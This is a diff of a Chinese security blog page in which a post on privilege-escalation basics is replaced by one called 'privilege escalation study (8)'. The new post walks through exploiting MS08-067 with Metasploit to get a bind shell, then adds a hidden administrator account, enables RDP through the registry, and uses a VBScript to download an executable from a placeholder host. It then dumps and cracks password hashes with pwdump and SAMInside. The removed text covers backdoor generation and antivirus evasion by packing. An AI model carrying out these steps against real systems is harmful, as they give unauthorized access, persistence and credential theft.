@@ -22,7 +22,7 @@
     <meta name="description" content>
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>提权学习（一） · violin&#39;s blog</title>
+    <title>提权学习（八） · violin&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/" >violin</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">提权学习（一）</a>
+                <a href="#" class="post-name">提权学习（八）</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            提权学习（一）
+            提权学习（八）
             <!-- 404 -->
             
         </h1>
@@ -272,12 +272,12 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">546</span>阅读时长: <span class="post-count reading-time">2 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">702</span>阅读时长: <span class="post-count reading-time">2 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2019/07/09</span>
+                    <span class="post-intro-time">2019/07/24</span>
                     
                     <span class="shareWrapper">
                         <span class="iconfont-archer shareIcon">&#xe71d;</span>
@@ -396,27 +396,65 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>常用的windows信息收集命令：<code>systeminfo</code> 、<code>ipconfig /all</code>、<code>net user</code>、<code>whoami</code>、<code>netstat -an</code> </p>
-<p>通过服务器所打的补丁判断可能存在的漏洞，准备提权工具（PR），然后寻找一个可写的目录将工具上传到服务器。<a id="more"></a></p>
-<h2 id="实施提权"><a href="#实施提权" class="headerlink" title="实施提权"></a>实施提权</h2><p><strong>提权原理</strong>：在wmi（windows管理规范）未正确地隔离networkservice和localservice账号下所运行的程序，导致同一账号下两个独立的进程可以完全访问对方的资源，在一些程序中可能存在system令牌，如果攻击者通过networkservice或者localservice账号登陆系统后，使用恶意程序获取到这个system令牌，便可以进行system权限下才能执行的操作，便实现了提权。</p>
-<p>（1）将工具上传到服务器</p>
-<p>​    Linux下可以用<code>wget</code>。windows可以用vbs脚本或者<code>bitsadmin</code>下载</p>
-<p>（2）尝试通过上传的工具进行提权</p>
-<p>（3）获取操作系统的账号信息</p>
-<p>​    可以使用的工具为：gethashes（已被加入病毒库）、gsecdump（已被加入病毒库）、pwdump（可获取本地账号信息，域控信息，bitlocker信息）、saminside（可获取server08及以下hash，并能进行一些简单hash的破解）、ophcrack（破解获取到的hash密码）、oclhashcat（号称最快的密码破解工具，基于GPU运算，多算法，支持分布式破解）、l0phtcrack（简称LC，密码审计工具，可获取本机所有账号，并破解）、john the ripper（破解Linux密码，kali十大安全工具之一）、Linux exploit suggester（依据Linux操作系统版本号，列出可能的漏洞，并查找EXP，14年停更）。</p>
-<h2 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h2><p>WebaCoo：一个后门管理工具，kali中自带。可以使用<code>-g</code>生成后门，<code>-t</code>连接受感染的服务器</p>
-<p>生成后门：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webacoo -g -o backdoor.php</span><br></pre></td></tr></table></figure>
+        <h2 id="MS08067远程溢出漏洞利用"><a href="#MS08067远程溢出漏洞利用" class="headerlink" title="MS08067远程溢出漏洞利用"></a>MS08067远程溢出漏洞利用</h2><p><strong>漏洞描述</strong>：ms08067全称为“windows server服务RPC请求缓冲区溢出漏洞”，当受影响的系统收到恶意的RPCq请求时，则可能造成远程代码执行。该漏洞在2000、XP、03中攻击者可以通过未经身份认证便利用该漏洞遭成任意代码执行。<a id="more"></a></p>
+<p><strong>漏洞利用</strong></p>
+<p>由于RPC使用端口139、445所以可以使用工具对系统进行445端口扫描。可以使用工具sfind.exe，用法如下(表示从IP地址1，扫描到IP地址2，完成后在扫描目录下打开sfind.txt查看结果)：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sfind.exe -p 445 ipaddress1 ipaddress2</span><br></pre></td></tr></table></figure>
 
-<p>连接后门：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webacoo  -t -u url</span><br></pre></td></tr></table></figure>
+<p>此次的利用工具采用metesploit，因为其中有已经成熟的exp</p>
+<p>打开msf之后使用<code>search ms08-067</code>命令搜索ms08067的exp:</p>
+<img src="/2019/07/24/提权学习（八）/1563976559775.png" title="tq_8">
 
-<p>连接后，<code>download filename</code>即可下载文件到本地</p>
-<h2 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h2><p>杀毒软件检测恶意文件的方式有：</p>
-<p>1、基于md5特征（修改MD5值免杀）</p>
-<p>2、基于特征码（修改特征码免杀）</p>
-<p>3、基于行为</p>
-<p>前两类均可以采用vmprotect ultimate 对工具进行加壳处理，达到一定程度的免杀。</p>
+<p>然后使用该exp进行配置攻击：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>show payload</code>查看当前可用的payload：</p>
+<img src="/2019/07/24/提权学习（八）/1563976826801.png" title="tq_8">
+
+<p>在本次实施攻击中采用了<code>generic/shell_bind_tcp</code>payload。</p>
+<p>通过show options查看需要配置的参数，可以知道只需配置被攻击主机的IP，RHOSTS参数即可：</p>
+<img src="/2019/07/24/提权学习（八）/1563976991407.png" title="tq_8">
+
+<p>然后使用如下的命令进行RHOSTS的配置:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set RHOSTS xx.xx.xx.xx</span><br></pre></td></tr></table></figure>
+
+<p>配置完成后，执行run命令，可以看到漏洞成功利用，返回了一个shell：</p>
+<img src="/2019/07/24/提权学习（八）/1563977187077.png" title="tq_8">
+
+<p>然后添加一个采用如下的命令添加用户，并提权到Administrators组权限：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net user test test123 /add</span><br><span class="line">net localgroup Administrators test /add</span><br><span class="line">net loaclgroup Administrators</span><br></pre></td></tr></table></figure>
+
+<p>可以看到成功将test用户添加到了管理员组：</p>
+<img src="/2019/07/24/提权学习（八）/1563977787859.png" title="tq_8">
+
+<p>然后查看3389是否开启：</p>
+<img src="/2019/07/24/提权学习（八）/1563977835551.png" title="tq_8">
+
+<p>可以看到，3389并没有开启，然后使用如下的命令远程开启3389端口：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>
+
+<p>命令执行之后，成功开启了3389端口：</p>
+<img src="/2019/07/24/提权学习（八）/1563978220036.png" title="tq_8">
+
+<p>然后使用rdesktop，和刚才建立的账号进行连接，成功连接到目标主机：</p>
+<img src="/2019/07/24/提权学习（八）/1563978598983.png" title="tq_8">
+
+<p>然后通过创建一个vbs脚本远程下载mimikatz进行密码的抓取，vbs脚本如下：</p>
+<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">' Set your settings</span></span><br><span class="line">    strFileURL = <span class="string">"http://www.xxx.com/2.exe"</span></span><br><span class="line">    strHDLocation = <span class="string">"c:\2.exe"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">' Fetch the file</span></span><br><span class="line">    <span class="keyword">Set</span> objXMLHTTP = <span class="built_in">CreateObject</span>(<span class="string">"MSXML2.XMLHTTP"</span>)</span><br><span class="line"></span><br><span class="line">    objXMLHTTP.open <span class="string">"GET"</span>, strFileURL, <span class="literal">false</span></span><br><span class="line">    objXMLHTTP.send()</span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> objXMLHTTP.Status = <span class="number">200</span> <span class="keyword">Then</span></span><br><span class="line"><span class="keyword">Set</span> objADOStream = <span class="built_in">CreateObject</span>(<span class="string">"ADODB.Stream"</span>)</span><br><span class="line">objADOStream.Open</span><br><span class="line">objADOStream.Type = <span class="number">1</span> <span class="comment">'adTypeBinary</span></span><br><span class="line"></span><br><span class="line">objADOStream.Write objXMLHTTP.ResponseBody</span><br><span class="line">objADOStream.Position = <span class="number">0</span>    <span class="comment">'Set the stream position to the start</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Set</span> objFSO = <span class="built_in">CreateObject</span>(<span class="string">"Scripting.FileSystemObject"</span>)</span><br><span class="line"><span class="keyword">If</span> objFSO.Fileexists(strHDLocation) <span class="keyword">Then</span> objFSO.DeleteFile strHDLocation</span><br><span class="line"><span class="keyword">Set</span> objFSO = <span class="literal">Nothing</span></span><br><span class="line"></span><br><span class="line">objADOStream.SaveToFile strHDLocation</span><br><span class="line">objADOStream.Close</span><br><span class="line"><span class="keyword">Set</span> objADOStream = <span class="literal">Nothing</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">if</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Set</span> objXMLHTTP = <span class="literal">Nothing</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到成功下载文件到c盘根路径之下：</p>
+<img src="/2019/07/24/提权学习（八）/1563981455740.png" title="tq_8">
+
+<p>本来打算直接上传mimikatz进行密码的抓取，可是上传之后竟然执行不了，少了一些dll文件，所以有重新下载了Pwdump.exe文件，进行hash的抓取，然后再对hash进行破解：</p>
+<img src="/2019/07/24/提权学习（八）/1563983226695.png" title="tq_8">
+
+<p>通过使用SAMInside对密码进行破解，发现administrator的密码为123456：</p>
+<img src="/2019/07/24/提权学习（八）/1563982891310.png" title="tq_8">
+
+<p>使用该密码对系统进行登陆尝试，并成功登陆：</p>
+<img src="/2019/07/24/提权学习（八）/1563983297048.png" title="tq_8">
+
+<p>至此，该漏洞利用完成。</p>
 
     </article>
     <!-- license  -->
@@ -425,17 +463,12 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href= "/2019/07/10/redis-未授权RCE复现/" title= "redis 未授权RCE复现">
-                    <div class="nextTitle">redis 未授权RCE复现</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2019/07/08/imgtest/" title= "hexo写文章教程">
-                    <div class="prevTitle">hexo写文章教程</div>
+                <a href= "/2019/07/18/提权学习（七）/" title= "提权学习（七）">
+                    <div class="prevTitle">提权学习（七）</div>
                 </a>
             
         </li>
@@ -538,7 +571,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#信息收集"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实施提权"><span class="toc-number">2.</span> <span class="toc-text">实施提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后门"><span class="toc-number">3.</span> <span class="toc-text">后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#免杀"><span class="toc-number">4.</span> <span class="toc-text">免杀</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#MS08067远程溢出漏洞利用"><span class="toc-number">1.</span> <span class="toc-text">MS08067远程溢出漏洞利用</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
